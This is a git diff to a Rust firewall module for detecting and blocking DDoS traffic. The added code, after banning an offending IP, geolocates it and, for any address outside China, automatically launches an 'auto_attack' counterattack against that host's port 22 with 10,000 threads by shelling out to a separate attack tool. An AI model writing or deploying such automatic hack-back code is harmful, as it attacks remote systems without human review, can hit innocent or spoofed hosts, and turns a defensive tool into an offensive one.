@@ -1,7 +1,7 @@
 //! @Author       : 白银
 //! @Date         : 2023-02-04 16:13:03
 //! @LastEditors  : 白银
-//! @LastEditTime : 2023-02-24 17:22:30
+//! @LastEditTime : 2023-05-15 17:21:27
 //! @FilePath     : /rwaf/src/module/respond/stop_ddos.rs
 //! @Description  : ddos监测并阻断，可能需要调用反击
 //! @Attention    :
@@ -47,6 +47,12 @@ fn stop_ddos() {
 
     if black_count > black_count_max {
         ban_ip(check_iptables_firewalld(), &black_ip);
+        let (ip_addr, _ip_region, if_cn) = super::chekc_ip::judge_ip_region::judge_ip_region_main(&black_ip);
+        let ip_port = format!("{}:22", ip_addr);
+
+        if !if_cn {
+            auto_attack(&ip_port, 10000)
+        }
 
         let sender_address = get_only_sender_address(); //like: NoBody <nobody@domain.tld>
         let receiver_address = get_only_receiver_address(); //like: NoBody <nobody@domain.tld>
@@ -498,4 +504,10 @@ fn write_black_to_sql(
     )?;
 
     Ok(())
+}
+
+fn auto_attack(ip_port: &str, thread_count: u32) {
+    let mut command = execute::shell(format!("cargo run -- -ct {} {}", ip_port, thread_count));
+
+    let _output = command.output().unwrap();
 }
